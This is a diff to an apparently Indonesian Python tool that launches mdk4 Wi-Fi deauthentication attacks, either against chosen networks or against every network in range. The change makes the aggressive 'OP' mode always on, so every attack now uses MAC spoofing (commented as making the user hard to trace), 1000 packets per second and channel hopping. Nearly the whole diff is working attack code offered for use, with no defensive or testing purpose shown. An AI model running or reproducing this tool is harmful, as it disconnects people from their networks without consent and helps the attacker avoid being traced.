@@ -310,23 +310,22 @@ def select_attack_mode():
     print(f"\n{BOLD}Pilih mode serangan:{RESET}")
     print(f"{GREEN}1.{RESET} Target spesifik (pilih target sendiri)")
     print(f"{GREEN}2.{RESET} Semua target (serang semua jaringan yang terdeteksi)")
-    print(f"{GREEN}3.{RESET} Mode OP (dengan MAC Spoofing + Packet Rate tinggi)")
 
     while True:
-        choice = input("\nNomor mode [1-3]: ").strip()
+        choice = input("\nNomor mode [1-2]: ").strip()
         if choice == "1":
             return "target"
         if choice == "2":
             return "all"
-        if choice == "3":
-            return "op"
-        print("Input salah, pilih 1, 2, atau 3.")
+        print("Input salah, pilih 1 atau 2.")
 
 
-def run_deauth_mdk4(targets, monitor_iface, op_mode=False):
+def run_deauth_mdk4(targets, monitor_iface):
     """
-    Menjalankan MDK4 untuk multiple target
-    - op_mode=True: Aktifkan MAC Spoofing (-f) dan Packet Rate tinggi (-s 1000)
+    Menjalankan MDK4 untuk multiple target dengan MODE OP
+    - MAC Spoofing (-f): Sulit dilacak
+    - Packet Rate 1000/s (-s 1000): Super agresif
+    - Channel Hopping (-c h): Serang semua channel
     """
     if not targets:
         print(f"{RED}Tidak ada target untuk diserang.{RESET}")
@@ -341,36 +340,27 @@ def run_deauth_mdk4(targets, monitor_iface, op_mode=False):
         target_file.close()
         
         # Tampilkan target yang akan diserang
-        print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 ke {len(targets)} target...{RESET}")
+        print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke {len(targets)} target...{RESET}")
         print(f"{YELLOW}Target yang diserang:{RESET}")
         for target in targets:
             print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
         
-        # Base command
+        # Base command dengan semua fitur OP
         mdk4_cmd = [
             "sudo",
             "mdk4",
             monitor_iface,
-            "d",  # Deauth mode
+            "d",            # Deauth mode
             "-B", target_file.name,  # Target list file
+            "-c", "h",      # High speed channel hopping
+            "-f",           # MAC Spoofing - Sulit dilacak!
+            "-s", "1000"    # 1000 packets per second - Super agresif!
         ]
         
-        # Mode OP: Aktifkan semua fitur
-        if op_mode:
-            mdk4_cmd.extend([
-                "-c", "h",      # High speed channel hopping
-                "-f",           # MAC Spoofing - Sulit dilacak!
-                "-s", "1000"    # 1000 packets per second - Super agresif!
-            ])
-            print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
-            print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
-            print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
-            print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
-        else:
-            mdk4_cmd.extend([
-                "-c", "h"       # High speed channel hopping saja
-            ])
-            print(f"\n{YELLOW}Mode Normal (tanpa spoofing){RESET}")
+        print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
+        print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
+        print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
+        print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
         
         print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
         print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
@@ -400,37 +390,30 @@ def run_deauth_mdk4(targets, monitor_iface, op_mode=False):
             pass
 
 
-def run_deauth_all_mdk4(monitor_iface, op_mode=False):
+def run_deauth_all_mdk4(monitor_iface):
     """
-    Menjalankan MDK4 untuk semua target (mode broadcast)
-    - op_mode=True: Aktifkan MAC Spoofing (-f) dan Packet Rate tinggi (-s 1000)
+    Menjalankan MDK4 untuk semua target dengan MODE OP
+    - MAC Spoofing (-f): Sulit dilacak
+    - Packet Rate 1000/s (-s 1000): Super agresif
+    - Channel Hopping (-c h): Serang semua channel
     """
-    print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 ke SEMUA target...{RESET}")
+    print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke SEMUA target...{RESET}")
     print(f"{YELLOW}MDK4 akan menyerang semua jaringan yang terdeteksi!{RESET}")
     
     mdk4_cmd = [
         "sudo",
         "mdk4",
         monitor_iface,
-        "d",  # Deauth mode
+        "d",            # Deauth mode
+        "-c", "h",      # High speed channel hopping
+        "-f",           # MAC Spoofing
+        "-s", "1000"    # 1000 packets per second
     ]
     
-    # Mode OP: Aktifkan semua fitur
-    if op_mode:
-        mdk4_cmd.extend([
-            "-c", "h",      # High speed channel hopping
-            "-f",           # MAC Spoofing
-            "-s", "1000"    # 1000 packets per second
-        ])
-        print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
-        print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
-        print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
-        print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
-    else:
-        mdk4_cmd.extend([
-            "-c", "h"       # High speed channel hopping saja
-        ])
-        print(f"\n{YELLOW}Mode Normal (tanpa spoofing){RESET}")
+    print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
+    print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
+    print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
+    print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
     
     print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
     print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
@@ -511,10 +494,7 @@ def main():
             # Pilih mode serangan
             attack_mode = select_attack_mode()
             
-            # Cek apakah mode OP dipilih
-            op_mode = (attack_mode == "op")
-            
-            if attack_mode in ["target", "op"]:
+            if attack_mode == "target":
                 # Mode target spesifik dengan multiple selection
                 print(f"{CYAN}{BOLD}[?]{RESET} Mau scan WiFi berapa detik?")
                 scan_input = input(f"{YELLOW}>> detik (default 10): {RESET}").strip()
@@ -531,11 +511,11 @@ def main():
                     print("\nTidak ada target terpilih, kembali ke awal.")
                     continue
                 
-                # Jalankan serangan MDK4 untuk target yang dipilih
-                run_deauth_mdk4(targets, monitor_iface, op_mode=op_mode)
+                # Jalankan serangan MDK4 OP untuk target yang dipilih
+                run_deauth_mdk4(targets, monitor_iface)
             else:
-                # Mode semua target
-                run_deauth_all_mdk4(monitor_iface, op_mode=op_mode)
+                # Mode semua target dengan OP
+                run_deauth_all_mdk4(monitor_iface)
             
             # Setelah serangan selesai, stop monitor mode
             stop_monitor_mode(monitor_iface)
